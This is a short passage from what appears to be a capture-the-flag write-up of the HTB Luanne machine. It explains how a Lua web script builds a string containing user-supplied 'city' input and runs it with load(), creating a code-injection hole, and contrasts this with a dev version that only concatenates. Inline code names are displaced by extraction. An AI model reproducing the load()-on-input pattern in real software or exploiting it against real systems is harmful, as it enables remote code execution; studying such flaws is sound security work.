    local json = string.format([[             
        httpd.write('{"code": 500,')                       
        httpd.write('"error": "unknown city: %s"}')           
        ]], city)  
    

So if I pass in , then will be:`city=0xdf``json`

    httpd.write('{"code": 500,')
    httpd.write('"error": "unknown city: 0xdf"}')
    

With this string built, it will pass that into :`load`

    load(json)()
    

That is the dangerous part. effectively loads the string into memory as Lua commands, and then the runs that. It’s kind of like calling on a string in Python (also dangerous).`load``()``eval`

In the dev version of this script, the error message generation is much cleaner:

    httpd.write("HTTP/1.1 500 Error\r\n")
    httpd.write("Content-Type: application/json\r\n\r\n")
    httpd.write('{"code": 500,')
    httpd.write('"error": "unknown city: ' .. city .. '"}')        
    

This time it’s just appending the city into the string, and then passing that to .`http.write`

[查看原网页: 0xdf.gitlab.io](https://0xdf.gitlab.io/2021/03/27/htb-luanne.html)